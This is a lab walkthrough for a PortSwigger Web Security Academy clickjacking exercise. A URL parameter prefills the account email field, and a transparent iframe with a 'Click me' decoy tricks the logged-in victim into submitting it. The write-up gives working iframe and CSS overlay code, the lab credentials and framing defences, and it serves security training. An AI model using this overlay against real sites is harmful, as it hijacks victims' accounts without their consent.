# Lab 02 — Clickjacking With Prefilled Form Input

## Objective

Exploit a clickjacking vulnerability where a form input can be prefilled through a URL parameter.

The attacker uses the parameter to populate the target form before the victim interacts with the framed page.

---

# Attack Concept

```text
Attacker Controls URL Parameter
        ↓
Target Account Page Loads
        ↓
Form Field Is Prepopulated
        ↓
Target Page Is Framed
        ↓
Iframe Made Transparent
        ↓
Decoy Positioned Over Target Button
        ↓
Victim Clicks
        ↓
Prepopulated Form Submitted
        ↓
Account Information Changed
```

---

# Step 1 — Log In

Log in to the lab using the credentials supplied by PortSwigger.

```text
Username: wiener
Password: peter
```

Open:

```text
/my-account
```

---

# Step 2 — Identify the Form

Inspect the account page.

Identify the form responsible for changing the account email address.

The form contains an email input and an action button.

Conceptually:

```html
<input type="email" name="email">
<button>Update email</button>
```

---

# Step 3 — Test URL Parameters

Try supplying an email address through the URL.

Example:

```text
/my-account?email=test@example.com
```

Inspect the page.

Determine whether:

```text
test@example.com
```

is automatically inserted into the email field.

---

# Step 4 — Confirm Prefill Behavior

If the supplied value appears in the form:

```text
URL Parameter
      ↓
Email Input
      ↓
Prepopulated Value
```

This provides the attacker with control over the initial form value.

---

# Step 5 — Check Frameability

Inspect the response headers.

Look for:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

especially:

```text
frame-ancestors
```

The target must be frameable for the clickjacking attack.

---

# Step 6 — Create Exploit Page

Open the:

```text
Exploit Server
```

Create an iframe pointing to the account page with the attacker-controlled email parameter.

Example:

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@example.com"></iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with the actual lab identifier.

---

# Step 7 — Create the Overlay

Use CSS to position a visible decoy over the target button.

Example:

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 300px;
        left: 60px;
        z-index: 1;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=attacker@example.com"></iframe>
```

---

# Step 8 — Align the Target

Keep:

```css
opacity: 0.1;
```

during testing.

The target page should remain partially visible.

Adjust:

```css
top
left
width
height
```

until:

```text
Visible Decoy
      ↓
Click me

Target Control
      ↓
Update email
```

are correctly aligned.

---

# Step 9 — Hide the iframe

Once the position is correct:

```css
opacity: 0.0001;
```

can be used to make the target page effectively invisible.

---

# Step 10 — Deliver Exploit

Save the exploit.

Then use:

```text
Deliver exploit to victim
```

The victim opens the attacker-controlled page while authenticated to the target application.

---

# Attack Sequence

```text
Victim Logged In
       ↓
Attacker Page Opened
       ↓
Target Page Loaded in iframe
       ↓
Email Field Already Contains Attacker Value
       ↓
Iframe Hidden
       ↓
Visible Decoy Shown
       ↓
Victim Clicks
       ↓
Update Email Button Activated
       ↓
Attacker-Controlled Email Submitted
```

---

# Why the Attack Works

The attacker does not need the victim to manually type the email address.

Instead:

```text
URL Parameter
      ↓
Prepopulates Form
```

Then:

```text
Clickjacking
      ↓
Tricks Victim Into Submitting Form
```

The combination produces:

```text
Prefilled Input
      +
Clickjacking
      ↓
Unintended Account Change
```

---

# Burp Suite Workflow

```text
Proxy
  ↓
HTTP History
  ↓
GET /my-account
  ↓
Inspect Form
  ↓
Test URL Parameter
  ↓
Confirm Prefill
  ↓
Check X-Frame-Options
  ↓
Check CSP
  ↓
Exploit Server
  ↓
Create iframe
  ↓
Create overlay
  ↓
Align button
  ↓
Deliver exploit
```

---

# Troubleshooting

## Email Is Not Prepopulated

Verify:

```text
Parameter name
Parameter value
URL encoding
Response behavior
```

Do not assume the parameter is always:

```text
email
```

Use the behavior of the lab to identify the correct parameter.

---

## iframe Is Blocked

Check:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

especially:

```text
frame-ancestors
```

---

## Button Alignment Is Incorrect

Temporarily increase:

```css
opacity: 0.1;
```

Then adjust:

```css
top
left
```

until the decoy is directly above the target button.

---

# Final Checklist

```text
☐ Logged in
☐ Identified email form
☐ Identified URL parameter
☐ Confirmed form prepopulation
☐ Confirmed target page is frameable
☐ Created iframe
☐ Added attacker-controlled email parameter
☐ Created decoy
☐ Aligned decoy with Update email
☐ Tested with partial opacity
☐ Reduced iframe opacity
☐ Delivered exploit
☐ Confirmed email change
☐ Lab solved
```

---

# Key Learning

This lab demonstrates that clickjacking can become more effective when the target application allows sensitive form values to be controlled through URL parameters.

The important chain is:

```text
URL-Controlled Input
        +
Frameable Page
        +
Clickjacking
        ↓
Unintended Form Submission
```

The correct defense is to prevent unauthorized framing using mechanisms such as:

```http
X-Frame-Options: DENY
```

or:

```http
Content-Security-Policy: frame-ancestors 'none';
```